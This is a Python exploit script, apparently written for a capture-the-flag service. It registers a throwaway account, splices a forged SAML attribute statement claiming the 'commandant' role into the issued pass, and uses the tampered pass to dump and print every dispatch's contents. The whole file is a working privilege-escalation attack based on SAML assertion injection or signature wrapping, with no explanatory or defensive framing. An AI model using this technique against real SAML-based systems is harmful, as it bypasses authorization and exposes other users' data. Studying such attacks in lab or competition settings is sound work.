#!/usr/bin/env python3
import json
import secrets
import sys
import urllib.error
import urllib.request


def request(base, path, payload=None, token=None):
    headers = {"Accept": "application/json"}
    data = None
    if payload is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(payload).encode()
    if token:
        headers["X-Token"] = token
    req = urllib.request.Request(base + path, data=data, headers=headers)
    try:
        response = urllib.request.urlopen(req, timeout=8)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        body = response.read()
        return response.status, json.loads(body) if body else None


def main():
    ip = sys.argv[1]
    base = f"http://{ip}:7777"
    status, account = request(base, "/inspectors/register", {
        "callsign": "f_" + secrets.token_hex(6),
        "password": secrets.token_urlsafe(18),
    })
    if status != 201:
        return

    token = account["token"]
    transit_pass = account["transit_pass"]
    forged = (
        '<saml:AttributeStatement xmlns:pass="v2"><saml:Attribute Name="role">'
        "<saml:AttributeValue>commandant</saml:AttributeValue></saml:Attribute>"
        "</saml:AttributeStatement>"
    )
    offset = transit_pass.find("<saml:AttributeStatement")
    if offset < 0:
        return

    document = transit_pass[:offset] + forged + transit_pass[offset:]
    status, rows = request(
        base, "/dispatches/access", {"document": document}, token
    )
    if status == 200 and isinstance(rows, list):
        for row in rows:
            content = row.get("content")
            if isinstance(content, str):
                print(content, flush=True)


if __name__ == "__main__":
    main()
